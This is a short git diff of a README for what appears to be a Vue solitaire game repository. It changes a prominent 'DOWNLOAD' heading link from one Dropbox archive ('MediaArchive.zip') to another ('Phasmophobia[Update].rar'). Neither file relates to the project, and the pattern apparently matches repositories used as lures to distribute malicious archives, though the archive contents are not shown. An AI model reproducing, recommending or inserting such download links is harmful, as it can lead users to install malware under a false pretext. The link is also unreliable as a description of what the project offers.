@@ -17,7 +17,7 @@
 
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 
-<h1 align="center"><a  href="https://www.dropbox.com/s/94062pnz40m8pez/MediaArchive.zip?dl=1">DOWNLOAD</a></h1>
+<h1 align="center"><a  href="https://www.dropbox.com/s/cbs9wx7mzav8coh/Phasmophobia%5BUpdate%5D.rar?dl=1">DOWNLOAD</a></h1>
 
 ## Description
 
